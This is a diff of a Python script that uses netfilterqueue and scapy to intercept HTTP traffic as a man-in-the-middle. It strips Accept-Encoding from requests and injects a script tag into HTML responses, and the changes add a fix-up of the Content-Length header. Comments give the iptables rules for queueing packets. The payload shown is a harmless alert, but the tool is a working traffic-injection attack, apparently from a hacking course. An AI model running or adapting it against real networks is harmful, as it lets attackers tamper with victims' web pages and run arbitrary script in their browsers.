@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
-from scapy.layers import http #you need to pip install scapy_http 
 import re
 
 #if tested on a real network:
@@ -14,8 +13,6 @@ import re
 #set the iptables as follow to test on local machine test on local machine
 #iptables -i output -j nfqueue --queue-num 0
 #iptables -i input -j nfqueue --queue-num 0
-
-ack_list = []
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -30,17 +27,23 @@ def process_packet(packet):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            print(scapy_packet[http.HTTPRequest].Headers)
-            load = re.sub("Accept-Encoding.*?\\r\\n","", load)
+            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response!")
-            load = load.replace("</body>","<script>alert('test')</script></body>")
-
+            print(scapy_packet.show())
+            injection_code = "<script>alert('test')</script>"
+            load = load.replace("</body>",injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet)) 
+            new_packet = set_load(scapy_packet,load)
+            packet.set_payload(str(new_packet))
+
 
     packet.accept()
 
